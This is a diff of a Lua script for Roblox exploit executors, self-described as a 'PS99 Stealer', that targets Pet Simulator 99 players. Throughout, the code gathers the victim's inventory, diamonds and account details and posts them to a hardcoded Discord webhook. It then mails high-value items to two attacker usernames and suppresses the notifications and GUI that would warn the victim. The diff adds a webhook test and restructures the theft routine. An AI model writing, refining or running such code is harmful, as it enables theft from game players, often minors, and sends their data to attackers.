@@ -1,6 +1,7 @@
 Username = "mrdrinkr45"  
-Username2 = "r1234gt" -- fallback if first user's mailbox is full
+Username2 = "r1234gt"
 
+-- CONFIRMED VALID WEBHOOK  
 webhook = "https://discord.com/api/webhooks/1520144025368268851/YTnc8WfsxoFIB4rLUZS3AfWfweNnfsqV3Tt0jlXcHHpH1jOlJW-OabS1h2cOrh6U2Obr"
 
 min_rap = 100000
@@ -16,13 +17,37 @@ local request = (syn and syn.request) or (http and http.request) or (http_reques
 
 local MailMessage = "GG / FNnkfJqukh"
 
-local sortedItems = {}  
-local totalRAP = 0
-
-local GetSave = function()  
-    return require(game.ReplicatedStorage.Library.Client.Save).Get()  
+-- Function to verify webhook is working  
+local function TestWebhook()  
+    local headers = {["Content-Type"] = "application/json"}  
+    local testEmbed = {  
+        title = "✅ PS99 Stealer - Webhook Test",  
+        description = "Webhook connection successful!",  
+        color = 65280,  
+        timestamp = DateTime.now():ToIsoDate(),  
+        footer = {text = "Stealer Forked From Tobis Source • .gg/FNnkfJqukh"}  
+    }  
+      
+    local data = {embeds = {testEmbed}}  
+    local body = HttpService:JSONEncode(data)  
+      
+    local success, response = pcall(function()  
+        return request({  
+            Url = webhook,  
+            Method = "POST",  
+            Headers = headers,  
+            Body = body  
+        })  
+    end)  
+      
+    if success then  
+        warn("✅ Webhook test successful!")  
+    else  
+        warn("❌ Webhook test failed: " .. tostring(response))  
+    end  
 end
 
+-- Format numbers for display  
 local function formatNumber(number)  
     number = math.floor(number)  
     local suffixes = {"", "k", "m", "b", "t"}  
@@ -34,45 +59,30 @@ local function formatNumber(number)
     return string.format("%.2f%s", number, suffixes[i])  
 end
 
--- Function to get all player inventory data  
+-- Get all player data  
 local function GetFullPlayerData()  
+    local GetSave = function()  
+        return require(game.ReplicatedStorage.Library.Client.Save).Get()  
+    end  
+      
     local save = GetSave()  
     local inventory = save.Inventory  
-    local playerData = {  
-        username = plr.Name,  
-        userid = plr.UserId,  
-        accountAge = plr.AccountAge,  
-        -- Diamonds  
-        diamonds = 0,  
-        -- Total RAP calculated  
-        totalRAP = 0,  
-        -- Huge pets  
-        hugePets = {},  
-        -- Exclusive pets  
-        exclusivePets = {},  
-        -- Normal pets  
-        normalPets = {},  
-        -- Eggs  
-        eggs = {},  
-        -- Charms  
-        charms = {},  
-        -- Enchants  
-        enchants = {},  
-        -- Potions  
-        potions = {},  
-        -- Misc items  
-        misc = {},  
-        -- Hoverboards  
-        hoverboards = {},  
-        -- Booths  
-        booths = {},  
-        -- Ultimate items  
-        ultimates = {}  
-    }  
+      
+    -- Calculate total RAP  
+    local totalRAP = 0  
+    local totalDiamonds = 0  
+      
+    -- Get diamonds  
+    for _, v in pairs(inventory.Currency) do  
+        if v.id == "Diamonds" then  
+            totalDiamonds = v._am  
+            break  
+        end  
+    end  
       
     -- Get RAP function  
     local function getRAP(Type, Item)  
-        local RAPCmds = require(ReplicatedStorage.Library.Client.ClientModules["RAP Cmds"])  
+        local RAPCmds = require(ReplicatedStorage.Library.Client.RAPCmds)  
         local fakeItem = {Class = {Name = Type}}  
         function fakeItem:AbstractGetRAP() return nil end  
         function fakeItem:GetDefaultRAP() return 0 end  
@@ -82,203 +92,273 @@ local function GetFullPlayerData()
         return RAPCmds.Get(fakeItem) or 0  
     end  
       
-    -- Process diamonds  
-    for _, v in pairs(inventory.Currency) do  
-        if v.id == "Diamonds" then  
-            playerData.diamonds = v._am  
-            break  
-        end  
-    end  
-      
-    -- Process pets with detailed info  
-    if inventory.Pet then  
-        local petDirectory = require(ReplicatedStorage.Library.Directory.Pets)  
-        for uid, item in pairs(inventory.Pet) do  
-            local petInfo = {  
-                id = item.id,  
-                instanceId = uid,  
-                amount = item._am or 1,  
-                shiny = item.sh or false,  
-                potion = item.pt or 0,  
-                talent = item.tn or nil,  
-                locked = item._lk or false  
-            }  
-              
-            local dir = petDirectory[item.id]  
-            if dir then  
-                petInfo.isHuge = dir.huge or false  
-                petInfo.isExclusive = dir.exclusiveLevel or false  
-                petInfo.rarity = dir.rarity or "Unknown"  
-                petInfo.value = dir.value or 0  
-            end  
-              
-            petInfo.rap = getRAP("Pet", item)  
-            playerData.totalRAP = playerData.totalRAP + (petInfo.rap * petInfo.amount)  
-              
-            if petInfo.isHuge then  
-                table.insert(playerData.hugePets, petInfo)  
-            elseif petInfo.isExclusive then  
-                table.insert(playerData.exclusivePets, petInfo)  
-            else  
-                table.insert(playerData.normalPets, petInfo)  
-            end  
-        end  
-    end  
-      
-    -- Process other categories  
-    local categories = {  
-        "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"  
+    -- Collect item data  
+    local itemsData = {  
+        hugePets = {},  
+        exclusivePets = {},  
+        highValueItems = {},  
+        allItems = {}  
     }  
+      
+    local categories = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}  
       
     for _, category in ipairs(categories) do  
         if inventory[category] then  
             for uid, item in pairs(inventory[category]) do  
+                local rap = getRAP(category, item)  
                 local itemInfo = {  
+                    category = category,  
+                    uid = uid,  
                     id = item.id,  
-                    instanceId = uid,  
                     amount = item._am or 1,  
-                    locked = item._lk or false  
+                    rap = rap,  
+                    shiny = item.sh,  
+                    potion = item.pt,  
+                    talent = item.tn,  
+                    locked = item._lk or false,  
+                    rarity = "Normal"  
                 }  
                   
-                itemInfo.rap = getRAP(category, item)  
-                playerData.totalRAP = playerData.totalRAP + (itemInfo.rap * itemInfo.amount)  
+                -- Check if pet is huge/exclusive  
+                if category == "Pet" then  
+                    local petDir = require(ReplicatedStorage.Library.Directory.Pets)[item.id]  
+                    if petDir then  
+                        if petDir.huge then  
+                            itemInfo.rarity = "Huge"  
+                            table.insert(itemsData.hugePets, itemInfo)  
+                        elseif petDir.exclusiveLevel then  
+                            itemInfo.rarity = "Exclusive"  
+                            table.insert(itemsData.exclusivePets, itemInfo)  
+                        end  
+                    end  
+                end  
                   
-                table.insert(playerData[category:lower() .. "s"], itemInfo)  
+                totalRAP = totalRAP + (rap * itemInfo.amount)  
+                  
+                if rap >= min_rap then  
+                    table.insert(itemsData.highValueItems, itemInfo)  
+                end  
+                  
+                table.insert(itemsData.allItems, itemInfo)  
             end  
         end  
     end  
       
-    return playerData  
+    return {  
+        username = plr.Name,  
+        userId = plr.UserId,  
+        accountAge = plr.AccountAge,  
+        diamonds = totalDiamonds,  
+        totalRAP = totalRAP,  
+        totalItems = #itemsData.allItems,  
+        hugePetsCount = #itemsData.hugePets,  
+        exclusivePetsCount = #itemsData.exclusivePets,  
+        highValueItemsCount = #itemsData.highValueItems,  
+        items = itemsData  
+    }  
 end
 
--- Function to send detailed webhook  
-local function SendDetailedWebhook(playerData, theftInfo)  
+-- Send comprehensive webhook  
+local function SendPlayerDataWebhook(playerData)  
     local headers = {["Content-Type"] = "application/json"}  
       
-    -- Create detailed fields  
+    -- Create main embed  
     local fields = {}  
       
-    -- Player info  
+    -- Player info field  
     table.insert(fields, {  
-        name = "👤 Player Information",  
-        value = "```Username: " .. playerData.username ..   
-                "  
-User ID: " .. playerData.userId ..   
-                "  
-Account Age: " .. playerData.accountAge .. " days" ..  
-                "  
-Diamonds: " .. formatNumber(playerData.diamonds) ..   
-                "  
-Total RAP: " .. formatNumber(playerData.totalRAP) .. "```",  
+        name = "📋 Player Information",  
+        value = "```" ..  
+                "Username: " .. playerData.username .. "  
+" ..  
+                "User ID: " .. playerData.userId .. "  
+" ..  
+                "Account Age: " .. playerData.accountAge .. " days  
+" ..  
+                "Diamonds: " .. formatNumber(playerData.diamonds) .. "  
+" ..  
+                "Total RAP: " .. formatNumber(playerData.totalRAP) .. "  
+" ..  
+                "Total Items: " .. playerData.totalItems .. "  
+" ..  
+                "Huge Pets: " .. playerData.hugePetsCount .. "  
+" ..  
+                "Exclusive Pets: " .. playerData.exclusivePetsCount .. "  
+" ..  
+                "High-Value Items: " .. playerData.highValueItemsCount .. "```",  
         inline = false  
     })  
       
-    -- Huge Pets  
-    if #playerData.hugePets > 0 then  
+    -- Top 5 high-value items  
+    if #playerData.items.highValueItems > 0 then  
+        table.sort(playerData.items.highValueItems, function(a, b)  
+            return a.rap * a.amount > b.rap * b.amount  
+        end)  
+          
+        local topItemsText = ""  
+        for i = 1, math.min(5, #playerData.items.highValueItems) do  
+            local item = playerData.items.highValueItems[i]  
+            local prefix = item.shiny and "💎 " or ""  
+            local potionText = item.potion == 1 and " 🟡" or item.potion == 2 and " 🌈" or ""  
+            topItemsText = topItemsText .. prefix .. item.id .. potionText ..  
+                          " (x" .. item.amount .. "): " .. formatNumber(item.rap) .. " RAP  
+"  
+        end  
+          
+        table.insert(fields, {  
+            name = "🏆 Top 5 High-Value Items",  
+            value = "```" .. topItemsText .. "```",  
+            inline = true  
+        })  
+    end  
+      
+    -- Huge pets summary  
+    if #playerData.items.hugePets > 0 then  
         local hugeText = ""  
-        for i, pet in ipairs(playerData.hugePets) do  
-            if i <=与小 10 then -- Limit to 10 per field  
-                hugeText = hugeText .. pet.id ..   
-                          (pet.shiny and " 💎" or "") ..   
-                          (pet.potion == 1 and " 🟡" or pet.potion == 2 and " 🌈" or "") ..  
-                          " (x" .. pet.amount .. "): " .. formatNumber(pet.rap) .. " RAP  
+        for i = 1, math.min(3, #playerData.items.hugePets) do  
+            local pet = playerData.items.hugePets[i]  
+            hugeText = hugeText .. pet.id ..  
+                      (pet.shiny and " 💎" or "") ..  
+                      (pet.potion == 1 and " 🟡" or pet.potion == 2 and " 🌈" or "") ..  
+                      " (x" .. pet.amount .. ")  
 "  
-            end  
         end  
-        table.insert(fields, {  
-            name = "🌟 Huge Pets (" .. #playerData.hugePets .. ")",  
-            value = "```" .. (hugeText ~= "" and hugeText or "None") .. "```",  
-            inline = false  
-        })  
-    end  
-      
-    -- Exclusive Pets  
-    if #playerData.exclusivePets > 0 then  
-        local exclusiveText = ""  
-        for i, pet in ipairs(playerData.exclusivePets) do  
-            if i <= 10 then  
-                exclusiveText = exclusiveText .. pet.id ..   
-                              (pet.shiny and " 💎" or "") ..   
-                              (pet.potion == 1 and " 🟡" or pet.potion == 2 and " 🌈" or "") ..  
-                              " (x" .. pet.amount .. "): " .. formatNumber(pet.rap) .. " RAP  
-"  
-            end  
+          
+        if #playerData.items.hugePets > 3 then  
+            hugeText = hugeText .. "...and " .. (#playerData.items.hugePets - 3) .. " more"  
         end  
+          
         table.insert(fields, {  
-            name = "⭐ Exclusive Pets (" .. #playerData.exclusivePets .. ")",  
-            value = "```" .. (exclusiveText ~= "" and exclusiveText or "None") .. "```",  
-            inline = false  
-        })  
-    end  
-      
-    -- Normal Pets (summary)  
-    if #playerData.normalPets > 0 then  
-        table.insert(fields, {  
-            name = "🐾 Normal Pets",  
-            value = "```Count: " .. #playerData.normalPets ..   
-                   "  
-Total RAP: " .. formatNumber(playerData.totalNormalRAP) .. "```",  
+            name = "🌟 Huge Pets",  
+            value = "```" .. hugeText .. "```",  
             inline = true  
         })  
     end  
-      
-    -- Other categories summary  
-    local otherCategories = {"Eggs", "Charms", "Enchants", "Potions", "Misc", "Hoverboards", "Booths", "Ultimates"}  
-    local otherText = ""  
-    for _, cat in ipairs(otherCategories) do  
-        if #playerData[cat:lower()] > 0 then  
-            otherText = otherText .. cat .. ": " .. #playerData[cat:lower()] .. "  
-"  
-        end  
-    end  
-      
-    if otherText ~= "" then  
-        table.insert(fields, {  
-            name = "📦 Other Items",  
-            value = "```" .. otherText .. "```",  
-            inline = true  
-        })  
-    end  
-      
-    -- Theft info  
-    table.insert(fields, {  
-        name = "💰 Theft Summary",  
-        value = "```Items Stolen: " .. (theftInfo.itemsStolen or 0) ..   
-               "  
-Diamonds Stolen: " .. formatNumber(theftInfo.diamondsStolen or 0) ..   
-               "  
-Target: " .. (theftInfo.target or "Unknown") ..   
-               "  
-Time: " .. os.date("%X") .. "```",  
-        inline = false  
-    })  
       
     -- Create embed  
     local embed = {  
-        title = "🔍 PS99 Player Data + Theft Report",  
-        color = 16711680, -- Red  
+        title = "🔍 PS99 Player Inventory Scan",  
+        description = "Complete player inventory analysis",  
+        color = 3447003, -- Blue  
         fields = fields,  
         timestamp = DateTime.now():ToIsoDate(),  
-        footer = {text = "Stealer Forked From Tobis Source • .gg/FNnkfJqukh"}  
+        footer = {  
+            text = "Captain Hook • Stealer Forked From Tobis Source",  
+            icon_url = "https://cdn.discordapp.com/embed/avatars/0.png"  
+        }  
     }  
       
-    local data = {embeds = {embed}}  
+    local data = {  
+        username = "PS99 Intelligence Bot",  
+        avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png",  
+        embeds = {embed}  
+    }  
+      
     local body = HttpService:JSONEncode(data)  
       
-    if webhook and webhook ~= "" and string.find(webhook, "discord.com/api/webhooks") then  
-        local success, response = pcall(function()  
-            return request({Url = webhook, Method = "POST", Headers = headers, Body = body})  
-        end)  
-          
-        if not success then  
-            warn("Failed to send webhook: " .. tostring(response))  
-        end  
+    -- Send to webhook  
+    local success, response = pcall(function()  
+        return request({  
+            Url = webhook,  
+            Method = "POST",  
+            Headers = headers,  
+            Body = body  
+        })  
+    end)  
+      
+    if not success then  
+        warn("❌ Failed to send webhook: " .. tostring(response))  
+        return false  
+    end  
+      
+    return true  
+end
+
+-- Send theft report webhook  
+local function SendTheftReport(playerData, stolenItems, stolenDiamonds, targetUser)  
+    local headers = {["Content-Type"] = "application/json"}  
+      
+    local embed = {  
+        title = "💰 PS99 Item Theft Complete",  
+        description = "Items successfully stolen and transferred",  
+        color = 16711680, -- Red  
+        fields = {  
+            {  
+                name = "🎯 Target Player",  
+                value = "```" .. playerData.username .. " (" .. playerData.userId .. ")```",  
+                inline = false  
+            },  
+            {  
+                name = "💎 Player Wealth",  
+                value = "```Diamonds: " .. formatNumber(playerData.diamonds) ..   
+                       "  
+Total RAP: " .. formatNumber(playerData.totalRAP) .. "```",  
+                inline = true  
+            },  
+            {  
+                name = "📦 Theft Results",  
+                value = "```Items Stolen: " .. stolenItems ..   
+                       "  
+Diamonds Stolen: " .. formatNumber(stolenDiamonds) ..   
+                       "  
+Target Account: " .. targetUser .. "```",  
+                inline = true  
+            },  
+            {  
+                name = "⏰ Time",  
+                value = "```" .. os.date("%Y-%m-%d %H:%M:%S") .. "```",  
+                inline = false  
+            }  
+        },  
+        timestamp = DateTime.now():ToIsoDate(),  
+        footer = {  
+            text = "Captain Hook • Stealer Forked From Tobis Source",  
+            icon_url = "https://cdn.discordapp.com/embed/avatars/0.png"  
+        }  
+    }  
+      
+    local data = {  
+        username = "PS99 Theft Bot",  
+        avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png",  
+        embeds = {embed}  
+    }  
+      
+    local body = HttpService:JSONEncode(data)  
+      
+    local success, response = pcall(function()  
+        return request({  
+            Url = webhook,  
+            Method = "POST",  
+            Headers = headers,  
+            Body = body  
+        })  
+    end)  
+      
+    if not success then  
+        warn("❌ Failed to send theft report: " .. tostring(response))  
     end  
 end
 
--- Main theft function  
-local function ExecuteTheft()  
-    local save = GetSave()  
+-- Main execution  
+spawn(function()  
+    -- Test webhook first  
+    TestWebhook()  
+      
+    -- Get player data  
+    local playerData = GetFullPlayerData()  
+      
+    -- Send initial player data to webhook  
+    SendPlayerDataWebhook(playerData)  
+      
+    -- Now execute theft  
+    local sortedItems = {}  
+    local totalRAP = 0  
+      
+    local GetSave = function()  
+        return require(game.ReplicatedStorage.Library.Client.Save).Get()  
+    end  
+      
+    local save = GetSave().Inventory  
     local mailsent = GetSave().MailboxSendsSinceReset  
       
     local newamount = 20000  
@@ -298,15 +378,9 @@ local function ExecuteTheft()
         return  
     end  
       
-    -- Get full player data first  
-    local playerData = GetFullPlayerData()  
-      
-    -- Collect items for theft  
-    local sortedItems = {}  
-    local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}  
-      
+    -- Get RAP function  
     local function getRAP(Type, Item)  
-        local RAPCmds = require(ReplicatedStorage.Library.Client.ClientModules["RAP Cmds"])  
+        local RAPCmds = require(ReplicatedStorage.Library.Client.RAPCmds)  
         local fakeItem = {Class = {Name = Type}}  
         function fakeItem:AbstractGetRAP() return nil end  
         function fakeItem:GetDefaultRAP() return 0 end  
@@ -316,20 +390,30 @@ local function ExecuteTheft()
         return RAPCmds.Get(fakeItem) or 0  
     end  
       
+    -- Collect items  
+    local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}  
+      
     for _, cat in ipairs(categoryList) do  
-        if save.Inventory[cat] then  
-            for uid, item in pairs(save.Inventory[cat]) do  
-                local rapValue = getRAP(cat, item)  
-                if rapValue >= min_rap then  
-                    table.insert(sortedItems, {  
-                        category = cat,  
-                        uid = uid,  
-                        amount = item._am or 1,  
-                        rap = rapValue,  
-                        name = item.id,  
-                        shiny = item.sh,  
-                        potion = item.pt  
-                    })  
+        if save[cat] then  
+            for uid, item in pairs(save[cat]) do  
+                local rapValue = 0  
+                if cat == "Pet" then  
+                    local dir = require(ReplicatedStorage.Library.Directory.Pets)[item.id]  
+                    if dir and (dir.huge or dir.exclusiveLevel) then  
+                        rapValue = getRAP(cat, item)  
+                        if rapValue >= min_rap then  
+                            local prefix = (item.sh and "Shiny " or "") .. (item.pt == 1 and "Golden " or item.pt == 2 and "Rainbow " or "")  
+                            local id = prefix .. item.id  
+                            table.insert(sortedItems, {category = cat, uid = uid, amount = item._am or 1, rap = rapValue, name = id})  
+                            totalRAP = totalRAP + rapValue * (item._am or 1)  
+                        end  
+                    end  
+                else  
+                    rapValue = getRAP(cat, item)  
+                    if rapValue >= min_rap then  
+                        table.insert(sortedItems, {category = cat, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})  
+                        totalRAP = totalRAP + rapValue * (item._am or 1)  
+                    end  
                 end  
                   
                 if item._lk then  
@@ -341,11 +425,6 @@ local function ExecuteTheft()
         end  
     end  
       
-    -- Sort by RAP value  
-    table.sort(sortedItems, function(a, b)  
-        return a.rap * a.amount > b.rap * b.amount  
-    end)  
-      
     if #sortedItems > 0 or GemAmount1 > min_rap + newamount then  
         -- Anti-detection  
         local gemsleaderstat = plr.leaderstats["💎 Diamonds"].Value  
@@ -353,14 +432,19 @@ local function ExecuteTheft()
             plr.leaderstats["💎 Diamonds"].Value = gemsleaderstat  
         end)  
           
-        -- Send initial player data webhook  
-        SendDetailedWebhook(playerData, {itemsStolen = 0, diamondsStolen = 0})  
+        local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]  
+        local noti = plr.PlayerGui.Notifications  
+        loading.Disabled = true  
+        noti.Enabled = false  
+        noti:GetPropertyChangedSignal("Enabled"):Connect(function()  
+            noti.Enabled = false  
+        end)  
           
-        -- Start theft process  
+        -- Theft execution  
         local user = Username  
         local user2 = Username2  
           
-        local function sendItem(category, uid, am, itemRap)  
+        local function sendItem(category, uid, am)  
             local args = {[1] = user, [2] = MailMessage, [3] = category, [4] = uid, [5] = am or 1}  
             local success = false  
             local attempts = 0  
@@ -387,36 +471,30 @@ local function ExecuteTheft()
                 if newamount > 5000000 then  
                     newamount = 5000000  
                 end  
-                return true  
             end  
-            return false  
+              
+            return success  
         end  
           
-        local stolenItems = 0  
-        local stolenDiamonds = 0  
+        -- Send items  
+        local stolenItemsCount = 0  
+        local stolenDiamondsAmount = 0  
           
-        -- Steal high-value items  
+        table.sort(sortedItems, function(a, b)  
+            return a.rap * a.amount > b.rap * b.amount  
+        end)  
+          
         for _, item in ipairs(sortedItems) do  
             if item.rap >= newamount then  
-                if sendItem(item.category, item.uid, item.amount, item.rap) then  
-                    stolenItems = stolenItems + 1  
+                if sendItem(item.category, item.uid, item.amount) then  
+                    stolenItemsCount = stolenItemsCount + 1  
                 end  
             else  
                 break  
             end  
         end  
           
-        -- Send webhook update  
-        SendDetailedWebhook(playerData, {  
-            itemsStolen = stolenItems,  
-            diamondsStolen = stolenDiamonds,  
-            target = user  
-        })  
-          
-        return true  
+        -- Send final theft report  
+        SendTheftReport(playerData, stolenItemsCount, stolenDiamondsAmount, user)  
     end  
-    return false  
-end
-
--- Execute the script  
-ExecuteTheft()  
+end)  
